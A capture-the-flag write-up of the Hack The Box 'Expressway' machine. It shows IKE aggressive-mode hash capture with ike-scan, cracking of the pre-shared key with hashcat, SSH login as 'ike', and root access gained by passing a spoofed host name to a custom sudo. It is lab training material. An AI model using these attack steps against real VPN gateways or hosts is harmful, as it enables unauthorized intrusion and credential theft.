
<div style="background: linear-gradient(90deg, #0d1117 0%, #16213e 100%); padding: 25px; border-radius: 15px; border: 2px solid #9acd32; font-family: 'Inter', sans-serif; color: white; display: flex; align-items: center; gap: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.5);">
<div style="flex-shrink: 0; width: 90px; height: 90px; border-radius: 50%; border: 3px solid #9acd32; overflow: hidden; display: flex; justify-content: center; align-items: center; background: #0d1117;">
<img src="Tought Process/!Media/!Logo_Expressway.png" style="width: 100%; height: 100%; object-fit: cover;" onerror="this.src='https://www.hackthebox.com/storage/avatars/6aae4108848d5f493b26c68a4176953b.png'">
</div>
<div style="flex-grow: 1;">
<h1 style="margin: 0; font-size: 28px; color: #ffffff; text-transform: uppercase; letter-spacing: 2px;">Expressway <span style="font-size: 12px; color: #9acd32; border: 1px solid #9acd32; padding: 2px 8px; border-radius: 4px; vertical-align: middle; margin-left: 10px;">PWNED</span></h1>
<div style="display: flex; gap: 20px; margin-top: 12px; font-size: 13px;">
<span><span style="color: #9acd32;">💻</span> <b>OS:</b> Linux</span>
<span><span style="color: #9acd32;">🔥</span> <b>Diff:</b> Easy</span>
<span><span style="color: #9acd32;">📅</span> <b>Pwned:</b> 18 Feb 2026</span>
</div>
</div>
<div style="text-align: right;">
<div style="font-size: 10px; text-transform: uppercase; color: #9acd32; margin-bottom: 5px; letter-spacing: 1px;">Primary Vector</div>
<code style="background: rgba(255, 255, 255, 0.05); padding: 6px 12px; border-radius: 5px; border: 1px solid #9acd32; color: #9acd32; font-size: 11px; font-weight: bold;">a</code>
</div>
</div>

For this Box, I started with the usual nmap. The scan outputted:

```zsh
nmap -p- --min-rate 5000 -n -Pn <Expressway_IP>
```
```
Nmap scan report for <Expressway_IP>
Host is up (0.049s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds
```

Since the only open port was 22 (ssh), I decided to run nmap again, but in this case scanning for UDP.  Now we got:

```zsh
sudo nmap -sU --top-ports 100 -n -Pn <Expressway_IP>
```
```zsh
Nmap scan report for <Expressway_IP>
Host is up (0.044s latency).
Not shown: 96 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 120.00 seconds
```

Noticing the port 500 open (isakmp), e decided to scan it using ike-scan, since it's the default port for IKE implementations. The scan result was:

```zsh
sudo ike-scan 10.129.1.13
```
```
10.129.1.13     Main Mode Handshake returned HDR=(CKY-R=4e19028ec0c3c42d) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.914 seconds (1.09 hosts/sec).  1 returned handshake; 0 returned notify
```

Since we couldn't retrieve the Hash, I repeated the scan, but with the -A (agressive mode) flag. The Hash was captured:

```zsh
sudo ike-scan 10.129.1.13
```
```
10.129.1.13     Aggressive Mode Handshake returned HDR=(CKY-R=4e95499198514d92) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)  
  
Ending ike-scan 1.9.6: 1 hosts scanned in 0.094 seconds (10.64 hosts/sec).  1 returned handshake; 0 returned notify
```

We can see that now we captured the Hash(20 bytes) and we have the ID (ike@expressway.htb), we can try to crack the Hash, since SHA1 and 3DES are old and vulnerable. Just adding the -P flag was enough:

```
IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
73803f7bb6a249be19a3825dcfb89df2d9ffb855ebde3bfc5dad7fca1f7ce3d8295072f490f29247e07bd79d3b742fffd1bfc0c4a66226f2766a9cf183457c7fcb0e9bd8634f3ab1d1bc47bc4918be76728f9bcf928c1ca2c0a8aafff03e9822aadbfd4d43bbdec0c44f4b9056d56d062adfd7fa881d5bbdbe94d979d2e10696:19d164c4f2f7d78336e1b51d28e8c7a37f68fca5fb0979859bd4271867c2b109718e241bede36a70c89b310d308e38f0dbe6b980a4f78313f440078a4b9ae96607f843526896b8338668d351c0c3f4d2afb38c8b7b9f5a214b8fbfafab849b428ce02ad71bf95904979e79b3413f99537a577f969eb8463d243404c7fe93fa92:804e263a94981c03:2cd7673a8b4cc846:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:9d1c9af33c78542321055448d331bf6eea5c4f6f:d9d6baa6061d2bcc22b2cbff433eeeecc4773ae0236b2643976d97d6aacc60ae:dd6cadafb1bd5a495b3e845c0a398365e37d86c9
```

Using hashcat to crack the pass gives us the following:

```zsh
hashcat -a 0 Desktop/ike.hash /usr/share/wordlists/rockyou.txt
```
```
73803f7bb6a249be19a3825dcfb89df2d9ffb855ebde3bfc5dad7fca1f7ce3d8295072f490f29247e07bd79d3b742fffd1bfc0c4a66226f2766a9cf183457c7fcb0e9bd8634f3ab1d1bc47bc4918be76728f9bcf928c1ca2c0a8aafff03e9822aadbfd4d43bbdec0c44f4b9056d56d062adfd7fa881d5bbdbe94d979d2e10696:19d164c4f2f7d78336e1b51d28e8c7a37f68fca5fb0979859bd4271867c2b109718e241bede36a70c89b310d308e38f0dbe6b980a4f78313f440078a4b9ae96607f843526896b8338668d351c0c3f4d2afb38c8b7b9f5a214b8fbfafab849b428ce02ad71bf95904979e79b3413f99537a577f969eb8463d243404c7fe93fa92:804e263a94981c03:2cd7673a8b4cc846:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:9d1c9af33c78542321055448d331bf6eea5c4f6f:d9d6baa6061d2bcc22b2cbff433eeeecc4773ae0236b2643976d97d6aacc60ae:dd6cadafb1bd5a495b3e845c0a398365e37d86c9:freakingrockstarontheroad

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5400 (IKE-PSK SHA1)
Hash.Target......: 175034f147ecdc41983adc3f16716a8d1f3474f028fee236727...201d88
Time.Started.....: Wed Feb 18 04:07:07 2026 (11 secs)
Time.Estimated...: Wed Feb 18 04:07:18 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   740.8 kH/s (8.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8052736/14344385 (56.14%)
Rejected.........: 0/8052736 (0.00%)
Restore.Point....: 8044544/14344385 (56.08%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: freaky97 -> franchiscoymary89
Hardware.Mon.#1..: Temp: 55c Util: 80%

Started: Wed Feb 18 04:06:12 2026
Stopped: Wed Feb 18 04:07:19 2026
```

I tried the pass "freakingrockstarontheroad" on the ssh (with the user we obtained via ID on the ike-scan) and...:

```zsh
ssh ike@expressway.htb
```
```
ike@expressway.htb's password: freakingrockstarontheroad

ike@expressway:~$
```

By doing ls we see "user.txt", and outputting it to the console via cat shows us the user flag!

```zsh
ike@expressway:~$ ls
user.txt
ike@expressway:~$ cat user.txt
75aadea080**********************
```

Testing "sudo -l" and "id" makes us raise a suspicion. The message that "sudo -l" outputs is not default, and why are we in the group "proxy"?:

```zsh
ike@expressway:~$ sudo -l
Password:
Sorry, user ike may not run sudo on expressway.
ike@expressway:~$ which sudo  
/usr/local/bin/sudo
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

Searching which files the group "proxy" as access, we find this:

``` zsh
ike@expressway:~$ find / -group proxy -ls 2>/dev/null  
1210      0 drwxr-xr-x   2 proxy    proxy          40 Feb 18 02:11     /run/squid  
17693      4 drwxr-xr-x   2 proxy    proxy        4096 Sep 16 16:02 /var/spool/squid  
15362      0 -rw-r-----   1 proxy    proxy           0 May 16  2025 /var/spool/squid/netdb.state  
17150      4 drwxr-xr-x   2 proxy    proxy        4096 Sep 16 16:02 /var/log/squid  
17151      4 -rw-r-----   1 proxy    proxy         941 Jul 23  2025 /var/log/squid/cache.log.2.gz  
17195      4 -rw-r-----   1 proxy    proxy          20 Jul 22  2025 /var/log/squid/access.log.2.gz  
17207      4 -rw-r-----   1 proxy    proxy        2192 Jul 23  2025 /var/log/squid/cache.log.1  
17222      8 -rw-r-----   1 proxy    proxy        4778 Jul 23  2025 /var/log/squid/access.log.1
```

After analyzing the files, "access.log.1" shows a very peculiar thing:

```zsh
ike@expressway:/var/log/squid$ cat access.log.1  
1753229566.990      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -  
1753229580.379      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -  
1753229580.417     15 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3944 GET /nmaplowercheck1753229281 - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /flumemaster.jsp - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3916 GET /master.jsp - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3914 GET /.git/HEAD - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /tasktracker.jsp - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3914 GET /rs-status - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://www.google.com/ - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3902 POST /sdk - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -  
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html  
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 XDGY / - HIER_NONE/- text/html  
1753229689.010      0 192.168.68.50 NONE_NONE/400 3916 GET /evox/about - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3906 GET /HNAP1 - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 TCP_DENIED/403 381 HEAD http://www.google.com/ - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3934 GET /browseDirectory.jsp - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3924 GET /jobtracker.jsp - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3916 GET /status.jsp - HIER_NONE/- text/html  
1753229689.114      0 192.168.68.50 NONE_NONE/400 3916 GET /robots.txt - HIER_NONE/- text/html  
1753229689.114      0 192.168.68.50 NONE_NONE/400 3922 GET /dfshealth.jsp - HIER_NONE/- text/html  
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229689.165      0 192.168.68.50 NONE_NONE/400 3918 GET /favicon.ico - HIER_NONE/- text/html  
1753229689.222      0 192.168.68.50 TCP_DENIED/403 3768 CONNECT www.google.com:80 - HIER_NONE/- text/html  
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.322      0 192.168.68.50 NONE_NONE/400 381 HEAD / - HIER_NONE/- text/html  
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229689.475      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.526      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html  
1753229689.629      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.680      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.783      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.933      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229690.086      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229719.140      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229719.245      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229760.700      0 192.168.68.50 NONE_NONE/400 3918 GET /randomfile1 - HIER_NONE/- text/html  
1753229760.722      0 192.168.68.50 NONE_NONE/400 3908 GET /frand2 - HIER_NONE/- text/html
```

The most important line here is:
```zsh 1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html```
Since we have a custom sudo file, that blocks running sudo in the hostname "expressway", but we found another hostname "offramp", we can try running sudo as that hostname:

```zsh
ike@expressway:/usr/bin$ /usr/local/bin/sudo -h offramp.expressway.htb ./bash  
root@expressway:/usr/bin#
```

And like that, we're in as a sudo. Now we just need to find the root.txt:

```zsh
root@expressway:/usr/bin# cd ~
root@expressway:~# ls
root.txt
root@expressway:~# cat root.txt
9b01bce973**********************
```